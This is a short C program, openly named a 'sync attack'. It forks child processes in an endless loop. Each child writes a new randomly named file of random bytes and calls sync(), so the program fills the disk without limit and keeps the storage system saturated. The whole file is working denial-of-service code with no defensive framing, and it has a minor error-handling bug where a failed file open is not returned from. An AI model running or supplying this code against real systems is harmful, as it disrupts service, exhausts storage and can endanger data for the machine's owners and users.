//
// Created by 杜建璋 on 2024/2/5.
//
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <time.h>

void simulate_io_operations() {
    srand(time(NULL));
    FILE *fp;
    char filename[100];
    sprintf(filename, "%s%d", "temp", rand());

    // Open file. If not existed, create.
    fp = fopen(filename, "ab");
    if (fp == NULL) {
        perror("Error opening file");
    }

    // Random content
    for (size_t i = 0; i < 1024; ++i) {
        char randomByte = rand() % 256; // 0-255
        fwrite(&randomByte, sizeof(char), 1, fp);
    }

    fclose(fp);
}

void perform_sync_attack() {
    while (1) {
        // Fork a child process
        pid_t pid = fork();

        if (pid == -1) {
            perror("Error in fork");
            exit(EXIT_FAILURE);
        }

        if (pid == 0) { // Child process
            // Cache some data
            simulate_io_operations();

            // Invoke sync system call
            sync();

            exit(EXIT_SUCCESS);
        } else { // Parent process
            wait(NULL);

            printf("Sync attack completed.\n");
        }
    }
}

int main() {
    printf("Running the main program...\n");

    // Perform the sync attack
    perform_sync_attack();

    return 0;
}